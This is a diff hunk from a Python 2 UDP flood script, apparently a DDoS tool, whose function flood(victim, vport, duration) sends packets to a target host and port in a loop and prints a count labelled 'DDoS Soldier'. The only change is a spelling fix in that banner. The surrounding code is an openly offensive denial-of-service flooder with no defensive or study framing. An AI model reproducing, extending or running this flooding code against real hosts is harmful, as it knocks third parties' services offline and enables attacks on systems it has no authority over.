@@ -25,7 +25,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "\033[1;90mStart \033[1;97m%s \033[1;90mDDoS Soilder sended \033[1;97m%s \033[1;90mBy Port \033[1;97m%s" % (sent, victim, vport)
+        print "\033[1;90mStart \033[1;97m%s \033[1;90mDDoS Soldier sended \033[1;97m%s \033[1;90mBy Port \033[1;97m%s" % (sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
